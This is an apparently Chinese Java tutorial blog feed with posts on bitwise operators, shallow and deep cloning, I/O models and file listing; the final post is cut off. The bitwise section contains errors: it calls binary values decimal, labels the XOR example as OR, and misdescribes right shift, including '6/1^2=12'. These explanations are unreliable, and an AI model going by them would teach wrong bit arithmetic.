    <content type="html"><![CDATA[<h2 id="位运算"><a href="#位运算" class="headerlink" title="位运算"></a>位运算</h2><p>位运算事将数字以二进制的形式进行计算的运算符. 可以分为: 按位与,按位或,按位异或,按位取反,左移,右移.</p><h2 id="十进制如何转换为二进制"><a href="#十进制如何转换为二进制" class="headerlink" title="十进制如何转换为二进制?"></a>十进制如何转换为二进制?</h2><p><code>二进制的规则是逢二进一</code>,”逢二进一”就是“等于或者超过二了就进一位”的缩写。<strong>类比十进制“逢十进一”</strong>，就是“等于或者超过十就进一位”.比如 14+17， 4+7 = 11 &gt; 10，所以个位不够用了，要向十位“进一”，即在十位再加上一，等于1+1+1（从个位进上来的）=3，而个位上保留4+7-10 = 1，所以14+17 = 31</p><p>二进制也是一样，比如 101 + 111，个位1+1 = 2，所以个位不够用了，要向二位“进一”，即在二位上再加一，个位上保留 2-2 = 0。同样，二位上本来是1，现在再加1，等于2，所以二位也不够用了，要向四位“进一”，即在四位上再加一，二位上保留 2-2 = 0。现在四位上 1 + 1 + 1（从二位上进上来的） = 3 &gt; 2，所以还要再向八位上“进一”，四位上保留3-2 = 1。八位上只有四位进上来的1，不等于二也不超过二，所以不用进一，这样就有 101 + 111 = 1100. <strong>十进制最高为9所以它逢10进1，二进制的最高位为1所以它逢2进1</strong></p><p>例如给一个数字: 12345,他对应的二进制表示是: 12345/2</p><table><thead><tr><th></th><th>2进制</th><th>8进制</th><th>10进制</th><th>16进制</th></tr></thead><tbody><tr><td>2进制</td><td></td><td>bin(int(x, 8))</td><td>bin(int(x, 10)) / Integer.toBinaryString(i)</td><td>bin(int(x, 16))</td></tr><tr><td>8进制</td><td>oct(int(x, 2))</td><td></td><td>oct(int(x, 10))</td><td>oct(int(x, 16))</td></tr><tr><td>10进制</td><td>int(x, 2)</td><td>int(x, 8)</td><td></td><td>int(x, 16)</td></tr><tr><td>16进制</td><td>hex(int(x, 2))</td><td>hex(int(x, 8))</td><td>hex(int(x, 10))</td><td></td></tr></tbody></table><h3 id="前10个数的二进制数据"><a href="#前10个数的二进制数据" class="headerlink" title="前10个数的二进制数据"></a>前10个数的二进制数据</h3><table><thead><tr><th>十进制</th><th>二进制</th></tr></thead><tbody><tr><td>0</td><td>0</td></tr><tr><td>1</td><td>1</td></tr><tr><td>2</td><td>10</td></tr><tr><td>3</td><td>11</td></tr><tr><td>4</td><td>100</td></tr><tr><td>5</td><td>101</td></tr><tr><td>6</td><td>110</td></tr><tr><td>7</td><td>111</td></tr><tr><td>8</td><td>1000</td></tr><tr><td>9</td><td>1001</td></tr></tbody></table><h2 id="按位与-amp"><a href="#按位与-amp" class="headerlink" title="按位与&amp;"></a>按位与&amp;</h2><p><strong>当两个操作的二进制对应位置都是1的时候结果是1,否则其他的运算都是0</strong> 例如: a=10, b=6进行按位与运算,对应的a的十进制是: 1010,对应的b的十进制是: 110,也就是1010&amp;0110,那么结果就是: 0010,则对应的十进制是: 2</p><h2 id="按位或"><a href="#按位或" class="headerlink" title="按位或|"></a>按位或|</h2><p><strong>当两个操作的二进制对应位置都是0时候结果是0,否则都是1</strong>,例如: a=10,b=6进行按位或运算,对应的a的十进制是: 1010,对应的b的十进制是: 110,也就是1010|0110,那么结果是: 1110, 则对应的十进制是: 14</p><h2 id="按位异或"><a href="#按位异或" class="headerlink" title="按位异或^"></a>按位异或^</h2><p><strong>当两个操作的二进制对应位置数字不同的时候结果是1,否则其他的运算都是0</strong>, 例如:a=10,b=6进行按位或运算,对应的a的十进制是: 1010,对应的b的十进制是: 110,也就是1010^0110.那么结果是: 1100,也就是十进制对应的:12</p><h2 id="按位取反"><a href="#按位取反" class="headerlink" title="按位取反~"></a>按位取反~</h2><p><strong>就是将对应的二进制数字的0变成1,1变成0</strong>,例如10,也就是~10,对应的二进制是: 1010,那么他取反后就是: 0101</p><h2 id="按位左移-lt-lt"><a href="#按位左移-lt-lt" class="headerlink" title="按位左移&lt;&lt;"></a>按位左移&lt;&lt;</h2><p><strong>左移运算就是将一个二进制数向左移动指定的位数,左移后的前面的位置被丢失,后面的位置用0补充</strong>.比如说a=6 对应的二进制是0110,那么a&lt;&lt;1就是1100,就是12; 那么a&lt;&lt;2就是11000=24,<strong>实际上将一个数字左移几位就是对应的将它乘以几次2, 例如6左移一位就是6X2=12, 左移两位就是乘以2^2,就是24.</strong></p><h2 id="按位右移-gt-gt"><a href="#按位右移-gt-gt" class="headerlink" title="按位右移&gt;&gt;"></a>按位右移&gt;&gt;</h2><p><strong>同理右移运算就是将一个二进制数向右移动指定的位数,右移后的前面的位置被丢失,后面的位置用0补充</strong>,比如说a=6,对应的二进制是0110,那么a右移一位就是0011,对应的就是二进制的3,a右移两位就是0001,就是1,<strong>实际上将一个数字右移几位就是对应的将它除以几次2, 例如6右移一位就是6/1^2=12, 右移两位就是除以2^2,就是6/2^2.</strong></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>本文的文档总结参考来自一些网上相关文档整理和自己的实操总结,参考链接如下:</p><ul><li><a href="https://www.ixigua.com/6937552492896977447" target="_blank" rel="noopener">动画演示位运算操作</a></li><li><a href="https://www.zhihu.com/question/20363862" target="_blank" rel="noopener">二进制里的「逢二进一」是什么意思？</a></li><li><a href="https://www.cnblogs.com/wendy-notes/p/13271745.html" target="_blank" rel="noopener">十进制转为二进制的两种方法</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;位运算&quot;&gt;&lt;a href=&quot;#位运算&quot; class=&quot;headerlink&quot; title=&quot;位运算&quot;&gt;&lt;/a&gt;位运算&lt;/h2&gt;&lt;p&gt;位运算事将数字以二进制的形式进行计算的运算符. 可以分为: 按位与,按位或,按位异或,按位取反,左移,右移.&lt;/p&gt;
&lt;h2 id=</summary>
      
    
    
    
    <category term="软件开发" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/"/>
    
    <category term="程序语言" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/"/>
    
    <category term="Java" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/"/>
    
    <category term="java基础系列" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/java%E5%9F%BA%E7%A1%80%E7%B3%BB%E5%88%97/"/>
    
    
    <category term="java基础" scheme="https://seniortesting.club/tags/java%E5%9F%BA%E7%A1%80/"/>
    
    <category term="java" scheme="https://seniortesting.club/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>java基础(10) - equals和hashcode</title>
    <link href="https://seniortesting.club/posts/eh8x51Eg6EFh/"/>
    <id>https://seniortesting.club/posts/eh8x51Eg6EFh/</id>
    <published>2021-04-14T15:14:50.000Z</published>
    <updated>2021-04-18T13:00:39.463Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Java-深拷贝浅拷贝"><a href="#Java-深拷贝浅拷贝" class="headerlink" title="Java 深拷贝浅拷贝"></a>Java 深拷贝浅拷贝</h2><h3 id="1、什么是浅拷贝、深拷贝？"><a href="#1、什么是浅拷贝、深拷贝？" class="headerlink" title="1、什么是浅拷贝、深拷贝？"></a>1、什么是浅拷贝、深拷贝？</h3><p>这里总结一下就是：<br>• 浅拷贝：对于基本类型的数据进行值传递，对于指向对象的引用本质也是值传递，传递的是对象在堆中的内存地址，这样有个问题就是浅拷贝后的两个引用，都是指向的同一个对象，改变其中一个都会影响到另一个。</p><p>• 深拷贝：对于基本类型的数据进行值传递，对于指向对象的应用，直接new一个对象出来，并复制老对象的内容给新对象，深拷贝后的两个引用指向的是两个不同的对象，但对象的成员属性都相等（equals）。</p><h3 id="2、Object的clone方法和Cloneable接口"><a href="#2、Object的clone方法和Cloneable接口" class="headerlink" title="2、Object的clone方法和Cloneable接口"></a>2、Object的clone方法和Cloneable接口</h3><p>实现拷贝是调用的clone方法，该方法在Object里定义，如下：<br>protected native Object clone() throws CloneNotSupportedException;<br>可以看到这个方法用了native关键字修饰，native关键字意思是这个方法不是用java语言实现的，而是用的底层的C语言去实现的，具体实现过程肯定在java源文件里找不到的。这里我们需要知道的是：<strong>Object类里的clone方法实现的是浅拷贝</strong>。</p><p>所有调用clone方法的对象都必须实现Cloneable接口，否则会抛出CloneNotSupportedException异常，Cloneable接口源码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Cloneable</span> </span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到它其实什么方法都不需要实现。对Cloneable接口可以简单的理解只是一个标记，意思是如果一个类实现了Cloneable接口，这个类的对象就允许被拷贝。</p><h2 id="3、浅拷贝示例"><a href="#3、浅拷贝示例" class="headerlink" title="3、浅拷贝示例"></a>3、浅拷贝示例</h2><p>Student类:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Clone;</span><br><span class="line"><span class="keyword">import</span> lombok.EqualsAndHashCode;</span><br><span class="line"><span class="keyword">import</span> lombok.Getter;</span><br><span class="line"><span class="keyword">import</span> lombok.Setter;</span><br><span class="line"><span class="meta">@Getter</span></span><br><span class="line"><span class="meta">@Setter</span></span><br><span class="line"><span class="meta">@EqualsAndHashCode</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="keyword">implements</span> <span class="title">Cloneable</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> Subject subject;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">(String name, <span class="keyword">int</span> age, Subject subject)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">        <span class="keyword">this</span>.subject = subject;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> Object <span class="title">clone</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">super</span>.clone();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (CloneNotSupportedException e)</span><br><span class="line">        &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Subject类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Clone;</span><br><span class="line"><span class="keyword">import</span> lombok.EqualsAndHashCode;</span><br><span class="line"><span class="keyword">import</span> lombok.Getter;</span><br><span class="line"><span class="keyword">import</span> lombok.Setter;</span><br><span class="line"><span class="meta">@Setter</span></span><br><span class="line"><span class="meta">@Getter</span></span><br><span class="line"><span class="meta">@EqualsAndHashCode</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Subject</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String subjectName;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> score;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Subject</span><span class="params">(String subjectName, <span class="keyword">int</span> score)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.subjectName = subjectName;</span><br><span class="line">        <span class="keyword">this</span>.score = score;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">Main:</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Subject subject = <span class="keyword">new</span> Subject(<span class="string">&quot;Math&quot;</span>, <span class="number">100</span>);</span><br><span class="line">        String studentName = <span class="string">&quot;Jerry&quot;</span>;</span><br><span class="line">        <span class="keyword">int</span> age = <span class="number">27</span>;</span><br><span class="line">        Student studentJerry = <span class="keyword">new</span> Student(studentName, age, subject);</span><br><span class="line">        <span class="comment">// 调用clone方法克隆一个Student对象</span></span><br><span class="line">        Student studentClone = (Student) studentJerry.clone();</span><br><span class="line">        System.out.println(<span class="string">&quot;两个Student对象比较：&quot;</span> + String.valueOf(studentJerry == studentClone));</span><br><span class="line">        System.out.println(<span class="string">&quot;两个Student对象的subject对象比较：&quot;</span> + String.valueOf(studentJerry.getSubject() == studentClone.getSubject()));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行结果如下：<br>两个Student对象比较：false<br>两个Student对象的subject对象比较：true</p><p>可以看到，Student对象已经重新生成了一个，但是两个Student对象里的Subject引用还是指向的同一个Subject对象，这就是浅拷贝的效果。</p><h3 id="4、深拷贝示例"><a href="#4、深拷贝示例" class="headerlink" title="4、深拷贝示例"></a>4、深拷贝示例</h3><p>实现深拷贝比较常用的方案有两种：</p><ol><li>序列化（serialization）这个对象，再反序列化回来，就可以得到这个新的对象，无非就是序列化的规则需要我们自己来写。</li><li>继续利用 clone() 方法，在要进行深拷贝的类里重写clone方法（该类必须实现了Cloneable接口），我们可以对类内的引用类型的变量递归地进行clone，直到没有引用类型的成员属性为止。</li></ol><p>这里以clone方法为例，实际上clone方法也是实现深拷贝最常用的方法。<br>改造上面的Subject类，也令其实现Cloneable接口，并实现clone方法。</p><p>Student类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Clone;</span><br><span class="line"><span class="keyword">import</span> lombok.EqualsAndHashCode;</span><br><span class="line"><span class="keyword">import</span> lombok.Getter;</span><br><span class="line"><span class="keyword">import</span> lombok.Setter;</span><br><span class="line"><span class="meta">@Getter</span></span><br><span class="line"><span class="meta">@Setter</span></span><br><span class="line"><span class="meta">@EqualsAndHashCode</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="keyword">implements</span> <span class="title">Cloneable</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> Subject subject;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">(String name, <span class="keyword">int</span> age, Subject subject)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">        <span class="keyword">this</span>.subject = subject;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> Object <span class="title">clone</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span></span><br><span class="line">        &#123;</span><br><span class="line">            Student student = (Student) <span class="keyword">super</span>.clone();</span><br><span class="line">            student.subject = (Subject) <span class="keyword">this</span>.subject.clone();</span><br><span class="line">            <span class="keyword">return</span> student;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (CloneNotSupportedException e)</span><br><span class="line">        &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Subject类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Clone;</span><br><span class="line"><span class="keyword">import</span> lombok.EqualsAndHashCode;</span><br><span class="line"><span class="keyword">import</span> lombok.Getter;</span><br><span class="line"><span class="keyword">import</span> lombok.Setter;</span><br><span class="line"><span class="meta">@Setter</span></span><br><span class="line"><span class="meta">@Getter</span></span><br><span class="line"><span class="meta">@EqualsAndHashCode</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Subject</span> <span class="keyword">implements</span> <span class="title">Cloneable</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String subjectName;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> score;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Subject</span><span class="params">(String subjectName, <span class="keyword">int</span> score)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.subjectName = subjectName;</span><br><span class="line">        <span class="keyword">this</span>.score = score;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> Object <span class="title">clone</span><span class="params">()</span> <span class="keyword">throws</span> CloneNotSupportedException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.clone();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>main方法不变，执行结果如下：<br>两个Student对象比较：false<br>两个Student对象的subject对象比较：false</p><p>可以看到，生成了两个Student对象，每个Student对象的Subject引用都指向了不同的Subject对象，达到了深拷贝的效果。<br>总结一下就是：<strong>深拷贝就是将一个类的所有引用类型的成员变量对应的类递归实现浅拷贝（实现Cloneable接口重写clone方法）</strong>。<br>参考<br><a href="https://www.cnblogs.com/plokmju/p/7357205.html" target="_blank" rel="noopener">https://www.cnblogs.com/plokmju/p/7357205.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Java-深拷贝浅拷贝&quot;&gt;&lt;a href=&quot;#Java-深拷贝浅拷贝&quot; class=&quot;headerlink&quot; title=&quot;Java 深拷贝浅拷贝&quot;&gt;&lt;/a&gt;Java 深拷贝浅拷贝&lt;/h2&gt;&lt;h3 id=&quot;1、什么是浅拷贝、深拷贝？&quot;&gt;&lt;a href=&quot;#1、什么</summary>
      
    
    
    
    <category term="软件开发" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/"/>
    
    <category term="程序语言" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/"/>
    
    <category term="Java" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/"/>
    
    <category term="java基础系列" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/java%E5%9F%BA%E7%A1%80%E7%B3%BB%E5%88%97/"/>
    
    
    <category term="java基础" scheme="https://seniortesting.club/tags/java%E5%9F%BA%E7%A1%80/"/>
    
    <category term="java" scheme="https://seniortesting.club/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>java基础(2) - IO流</title>
    <link href="https://seniortesting.club/posts/mD51Eg6EFh/"/>
    <id>https://seniortesting.club/posts/mD51Eg6EFh/</id>
    <published>2021-04-14T15:14:50.000Z</published>
    <updated>2021-04-18T13:00:39.463Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-BIO-NIO-AIO"><a href="#1-BIO-NIO-AIO" class="headerlink" title="1. BIO,NIO,AIO"></a>1. BIO,NIO,AIO</h2><blockquote><p>When you execute something synchronously, you wait for it to finish before moving on to another task. When you execute something asynchronously, you can move on to another task before it finishes.</p></blockquote><blockquote><p>当你同步执行某项任务时，你需要等待其完成才能继续执行其他任务。当你异步执行某些操作时，你可以在完成另一个任务之前继续进行。</p></blockquote><ul><li>同步 ：两个同步任务相互依赖，并且一个任务必须以依赖于另一任务的某种方式执行。 比如在A-&gt;B事件模型中，你需要先完成 A 才能执行B。 再换句话说，同步调用中被调用者未处理完请求之前，调用不返回，调用者会一直等待结果的返回。</li><li>异步： 两个异步的任务是完全独立的，一方的执行不需要等待另外一方的执行。再换句话说，异步调用中一调用就返回结果不需要等待结果返回，当结果返回的时候通过回调函数或者其他方式拿着结果再做相关事情，</li></ul><p>阻塞和非阻塞</p><ul><li>阻塞： 阻塞就是发起一个请求，调用者一直等待请求结果返回，也就是当前线程会被挂起，无法从事其他任务，只有当条件就绪才能继续。</li><li>非阻塞： 非阻塞就是发起一个请求，调用者不用一直等着结果返回，可以先去干其他事情。</li></ul><h3 id="1-1-BIO-Blocking-I-O"><a href="#1-1-BIO-Blocking-I-O" class="headerlink" title="1.1  BIO (Blocking I/O)"></a>1.1  BIO (Blocking I/O)</h3><p>同步阻塞I/O模式，数据的读取写入必须阻塞在一个线程内等待其完成。</p><h3 id="1-2"><a href="#1-2" class="headerlink" title="1.2"></a>1.2</h3><h2 id="2-listFiles-列出所有的文件"><a href="#2-listFiles-列出所有的文件" class="headerlink" title="2. listFiles 列出所有的文件"></a>2. listFiles 列出所有的文件</h2><p>一种是直接采用递归的方式（<code>new File(&quot;&quot;).listFiles();</code>），稍微有一点点复杂。</p><p>下面为简化模式java8代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">List&lt;String&gt; result = Files.walk(Paths.get(<span class="string">&quot;D:\\&quot;</span>))</span><br><span class="line">        .filter(Files::isRegularFile)</span><br><span class="line">        .map(path -&gt; path.getFileName().toString())</span><br><span class="line">        .collect(Collectors.toList());</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="文件复制-下载的时候报-premature-eof异常？"><a href="#文件复制-下载的时候报-premature-eof异常？" class="headerlink" title="文件复制/下载的时候报 premature eof异常？"></a>文件复制/下载的时候报 premature eof异常？</h2><p>在进行下载的时候偶尔会发现出现错误： <code>java.io.IOException: Premature EOF</code>,搜索发现，这个是普遍性的一个问题，解决方法：</p><p><a href="https://stackoverflow.com/questions/13210108/reading-a-web-page-in-java-ioexception-premature-eof" target="_blank" rel="noopener">https://stackoverflow.com/questions/13210108/reading-a-web-page-in-java-ioexception-premature-eof</a></p><p>发生Premature EOF的可能有：<br>　　1. 在stream到达EOF之前，stream已经结束。( no EOF marker)，显然这种情况下很有可能是响应超时、服务端处理错误、网络问题、防火墙。<br>　　2. EOF过早地出现了。( EOF marker comes earlier before it shoud be.)</p><p>目前，没有找到很好的有效的解决方法。因为，这个问题出现的原因有很多。有些是客户端问题，这种问题可以通过改善良好的代码习惯来杜绝。比如，要记住关闭流以及网络连接，合理使用网络和计算机资源。在读取网络流之前可以试探流是否已经准备好。</p><p>　　本人也遇到过Premature EOF的问题，最开始这个问题很令人头疼。当时是一个多线程的程序（而且线程数相对较多，10个），虽然对于一些线程返回的结果正常，然而也有一大部分的Premature EOF异常。为此，我检查了一遍又一遍的代码，上网找了许多潜在的解决方法，但均没有很好地解决问题。</p><p>　　考虑到这个异常有可能是服务器端的错误，以及我当时所调用的服务器的资源情况，最后我将线程数设置为2个这种异常便不再出现了。因此，可以猜测到程序的多线程调用造成了服务端程序的资源争抢等问题导致了Premature EOF异常。所以，在开发应用程序的过程中也应该注意到合理使用服务器的资源。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-BIO-NIO-AIO&quot;&gt;&lt;a href=&quot;#1-BIO-NIO-AIO&quot; class=&quot;headerlink&quot; title=&quot;1. BIO,NIO,AIO&quot;&gt;&lt;/a&gt;1. BIO,NIO,AIO&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;When you ex</summary>
      
    
    
    
    <category term="软件开发" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/"/>
    
    <category term="程序语言" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/"/>
    
    <category term="Java" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/"/>
    
    <category term="java基础系列" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/java%E5%9F%BA%E7%A1%80%E7%B3%BB%E5%88%97/"/>
    
    
    <category term="java基础" scheme="https://seniortesting.club/tags/java%E5%9F%BA%E7%A1%80/"/>
    
    <category term="IO流" scheme="https://seniortesting.club/tags/IO%E6%B5%81/"/>
    
    <category term="java" scheme="https://seniortesting.club/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>java基础(9) - 文件操作</title>
    <link href="https://seniortesting.club/posts/f5x51Eg6EFh/"/>
    <id>https://seniortesting.club/posts/f5x51Eg6EFh/</id>
    <published>2021-04-14T15:14:50.000Z</published>
    <updated>2021-04-18T13:00:39.463Z</updated>
    
    <content type="html"><![CDATA[<h2 id="得到当前代码运行的根目录路径？"><a href="#得到当前代码运行的根目录路径？" class="headerlink" title="得到当前代码运行的根目录路径？"></a>得到当前代码运行的根目录路径？</h2><p>可以参考地址： <a href="https://mkyong.com/java/how-to-get-the-current-working-directory-in-java/#:~:text=In%20Java%2C%20we%20can%20use%20System.getProperty%20%28%22user.dir%22%29%20to,program%20was%20launched%20%2F%2F%20e.g%20%2Fhome%2Fmkyong%2Fprojects%2Fcore-java%2Fjava-io%20System.out.println%20%28dir%29%3B" target="_blank" rel="noopener">https://mkyong.com/java/how-to-get-the-current-working-directory-in-java/#:~:text=In%20Java%2C%20we%20can%20use%20System.getProperty%20%28%22user.dir%22%29%20to,program%20was%20launched%20%2F%2F%20e.g%20%2Fhome%2Fmkyong%2Fprojects%2Fcore-java%2Fjava-io%20System.out.println%20%28dir%29%3B</a></p><p>代码参考如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 